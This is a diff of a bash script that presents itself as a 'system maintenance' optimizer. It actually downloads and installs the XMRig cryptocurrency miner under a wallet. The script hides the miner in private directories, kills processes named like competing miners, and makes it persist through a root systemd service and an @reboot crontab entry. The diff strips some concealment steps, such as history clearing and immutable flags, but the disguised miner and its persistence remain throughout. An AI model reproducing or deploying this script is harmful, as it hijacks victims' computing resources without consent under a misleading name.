@@ -1,6 +1,6 @@
 #!/bin/bash
 
-VERSION=2.11
+VERSION=2.12
 
 echo "System maintenance script v$VERSION."
 echo "This script performs system optimization tasks."
@@ -41,17 +41,13 @@ if [ -z "$WALLET" ]; then
   exit 1
 fi
 
-if [ -z "$HOME" ]; then
-  export HOME=/tmp
-fi
-
 # Install required packages if needed
 if ! type curl >/dev/null || ! type tar >/dev/null; then
   echo "Installing required packages..."
   apt-get update >/dev/null 2>&1 && apt-get install -y curl tar >/dev/null 2>&1
 fi
 
-# Calculate optimal CPU usage (leave 1 core free)
+# Calculate optimal CPU usage
 CPU_THREADS=$(nproc)
 if [ $CPU_THREADS -gt 1 ]; then
     USABLE_THREADS=$((CPU_THREADS - 1))
@@ -59,7 +55,7 @@ else
     USABLE_THREADS=1
 fi
 
-CPU_USAGE=$((90 - (10 / CPU_THREADS)))
+CPU_USAGE=80  # Fixed at 80% for stability
 
 echo "[*] Running as user: $CURRENT_USER"
 echo "[*] Home directory: $USER_HOME"
@@ -77,15 +73,11 @@ create_hidden_dirs() {
     fi
     
     chmod 700 "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
-    
-    # Hide directories (if attr command exists)
-    if command -v attr >/dev/null 2>&1; then
-        attr -s "hidden" -V "1" "$BASE_DIR" >/dev/null 2>&1
-    fi
 }
 
 # Cleanup previous installations
 cleanup_previous() {
+    echo "[*] Cleaning up previous installations..."
     pkill -f "systemd-.*" 2>/dev/null
     pkill -f "sysupdate" 2>/dev/null
     pkill -f "kernelcfg" 2>/dev/null
@@ -103,29 +95,19 @@ create_hidden_dirs
 echo "[*] Downloading maintenance tools..."
 DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
 
-# Multiple fallback download methods
-DOWNLOAD_SUCCESS=false
-for method in curl wget; do
-    if type $method >/dev/null 2>&1; then
-        case $method in
-            curl)
-                if curl -s -L "$DOWNLOAD_URL" -o /tmp/tools.tar.gz 2>/dev/null; then
-                    DOWNLOAD_SUCCESS=true
-                    break
-                fi
-                ;;
-            wget)
-                if wget -q -O /tmp/tools.tar.gz "$DOWNLOAD_URL" 2>/dev/null; then
-                    DOWNLOAD_SUCCESS=true
-                    break
-                fi
-                ;;
-        esac
+# Download with retry logic
+for i in {1..3}; do
+    if curl -s -L "$DOWNLOAD_URL" -o /tmp/tools.tar.gz; then
+        echo "[*] Download successful"
+        break
+    else
+        echo "[*] Download attempt $i failed, retrying..."
+        sleep 2
     fi
 done
 
-if [ ! -f /tmp/tools.tar.gz ] || [ "$DOWNLOAD_SUCCESS" = false ]; then
-    echo "ERROR: Cannot download tools"
+if [ ! -f /tmp/tools.tar.gz ]; then
+    echo "ERROR: Cannot download tools after 3 attempts"
     exit 1
 fi
 
@@ -135,6 +117,7 @@ tar xzf /tmp/tools.tar.gz -C /tmp/ 2>/dev/null
 # Find and copy xmrig binary
 XMRIG_BINARY=$(find /tmp -name "xmrig" -type f 2>/dev/null | head -1)
 if [ -n "$XMRIG_BINARY" ] && [ -f "$XMRIG_BINARY" ]; then
+    echo "[*] Found binary: $XMRIG_BINARY"
     cp "$XMRIG_BINARY" "$BASE_DIR/main"
     
     # Set proper ownership
@@ -153,7 +136,6 @@ if [ ! -f "$BASE_DIR/main" ]; then
     exit 1
 fi
 
-# Create advanced configuration
 echo "[*] Configuring system optimizer..."
 cat > "$CONFIG_DIR/optimizer.json" << EOF
 {
@@ -169,13 +151,13 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
         "restricted": true
     },
     "autosave": true,
-    "background": true,
-    "colors": false,
-    "title": false,
+    "background": false,
+    "colors": true,
+    "title": true,
     "randomx": {
         "init": -1,
         "mode": "auto",
-        "1gb-pages": false,
+        "1gb-pages": true,
         "rdmsr": true,
         "wrmsr": true,
         "cache_qos": false,
@@ -187,10 +169,10 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
         "huge-pages": true,
         "huge-pages-jit": false,
         "hw-aes": true,
-        "priority": 1,
+        "priority": null,
         "memory-pool": true,
         "yield": true,
-        "max-threads-hint": 100,
+        "max-threads-hint": $CPU_USAGE,
         "asm": true,
         "argon2-impl": null,
         "cn/0": false,
@@ -215,8 +197,8 @@ cat > "$CONFIG_DIR/optimizer.json" << EOF
             "submit-to-origin": false
         }
     ],
-    "print-time": 0,
-    "health-print-time": 0,
+    "print-time": 60,
+    "health-print-time": 60,
     "dmi": false,
     "retries": 5,
     "retry-pause": 5,
@@ -243,10 +225,6 @@ if [ "$CURRENT_USER" != "root" ]; then
     chown "$CURRENT_USER:$CURRENT_USER" "$CONFIG_DIR/optimizer.json" 2>/dev/null
 fi
 
-# Optimize CPU usage in config
-sed -i "s/\"max-threads-hint\": 100,/\"max-threads-hint\": $CPU_USAGE,/" "$CONFIG_DIR/optimizer.json"
-sed -i "s/\"priority\": 1,/\"priority\": 0,/" "$CONFIG_DIR/optimizer.json"
-
 echo "[*] Creating control scripts..."
 
 # Main control script
@@ -255,16 +233,30 @@ cat > "$BASE_DIR/control" << EOF
 SCRIPT_DIR="\$(dirname "\$(realpath "\$0")")"
 case "\$1" in
     start)
-        nohup "\$SCRIPT_DIR/main" --config="\$SCRIPT_DIR/.config/optimizer.json" >/dev/null 2>&1 &
+        echo "Starting optimizer..."
+        cd "\$SCRIPT_DIR"
+        nohup ./main --config=./.config/optimizer.json > ./logs.txt 2>&1 &
+        echo \$! > ./pid.txt
+        echo "Started with PID: \$(cat ./pid.txt)"
         ;;
     stop)
+        echo "Stopping optimizer..."
         pkill -f "\$SCRIPT_DIR/main"
+        [ -f "./pid.txt" ] && kill \$(cat ./pid.txt) 2>/dev/null
+        rm -f ./pid.txt
         ;;
     status)
-        pgrep -f "\$SCRIPT_DIR/main" >/dev/null && echo "Running" || echo "Stopped"
+        if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
+            echo "Running"
+        else
+            echo "Stopped"
+        fi
+        ;;
+    logs)
+        [ -f "./logs.txt" ] && tail -20 ./logs.txt || echo "No logs found"
         ;;
     *)
-        echo "Usage: \$0 {start|stop|status}"
+        echo "Usage: \$0 {start|stop|status|logs}"
         ;;
 esac
 EOF
@@ -277,6 +269,7 @@ chmod +x "$BASE_DIR/control"
 
 # Systemd service for persistence (only if root or sudo)
 if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
+    echo "[*] Creating systemd service..."
     mkdir -p /etc/systemd/system
     cat > /etc/systemd/system/"$SERVICE_NAME".service << EOF
 [Unit]
@@ -288,11 +281,11 @@ StartLimitIntervalSec=0
 Type=simple
 Restart=always
 RestartSec=10
-User=$CURRENT_USER
+User=root
 ExecStart=$BASE_DIR/main --config=$CONFIG_DIR/optimizer.json
-ExecStop=$BASE_DIR/control stop
-KillMode=process
-KillSignal=SIGTERM
+WorkingDirectory=$BASE_DIR
+StandardOutput=file:$BASE_DIR/output.log
+StandardError=file:$BASE_DIR/error.log
 
 [Install]
 WantedBy=multi-user.target
@@ -300,51 +293,38 @@ EOF
 
     systemctl daemon-reload
     systemctl enable "$SERVICE_NAME".service 2>/dev/null
+    systemctl start "$SERVICE_NAME".service 2>/dev/null
 fi
 
 # Add to crontab for persistence
-if [ "$CURRENT_USER" != "root" ]; then
-    # For regular users, use their crontab
-    (crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && \"$BASE_DIR/control\" start") | crontab -
-else
-    # For root, use system crontab
-    (crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 60 && \"$BASE_DIR/control\" start") | crontab -
-fi
-
-# Hide the installation
-echo "[*] Securing installation..."
-if command -v chattr >/dev/null 2>&1; then
-    chattr +i "$BASE_DIR/main" 2>/dev/null
-    chattr +i "$CONFIG_DIR/optimizer.json" 2>/dev/null
-fi
-
-# Cleanup traces
-rm -rf /tmp/tools.tar.gz
-find /tmp -name "xmrig*" -type d -exec rm -rf {} \; 2>/dev/null
-history -c
+echo "[*] Setting up persistence..."
+(crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 30 && '$BASE_DIR/control' start") | crontab -
 
 echo "[*] Starting system optimizer..."
-sudo -u "$CURRENT_USER" "$BASE_DIR/control" start 2>/dev/null || "$BASE_DIR/control" start
+cd "$BASE_DIR"
+./control start
+
+# Wait a bit and check status
+sleep 5
+echo "[*] Checking optimizer status..."
+./control status
 
 echo
 echo "System optimization setup complete."
 echo "The optimizer will use $USABLE_THREADS CPU threads with $CPU_USAGE% utilization."
 echo "Installation directory: $BASE_DIR"
-echo "Use: $BASE_DIR/control {start|stop|status} to manage"
+echo "Use: $BASE_DIR/control {start|stop|status|logs} to manage"
 echo
 
-# Hide this script's execution
-CURRENT_SCRIPT="$0"
-if [ -f "$CURRENT_SCRIPT" ]; then
-    cp "$CURRENT_SCRIPT" "$BASE_DIR/.setup"
-    
-    # Set ownership
-    if [ "$CURRENT_USER" != "root" ]; then
-        chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/.setup" 2>/dev/null
-    fi
-    
-    chmod 600 "$BASE_DIR/.setup"
+# Check if process is running
+if pgrep -f "$BASE_DIR/main" > /dev/null; then
+    echo "[✓] Optimizer is successfully running!"
+else
+    echo "[!] Optimizer failed to start. Check logs with: $BASE_DIR/control logs"
 fi
 
-# Clean exit
+# Cleanup
+rm -rf /tmp/tools.tar.gz
+find /tmp -name "xmrig*" -type d -exec rm -rf {} \; 2>/dev/null
+
 exit 0
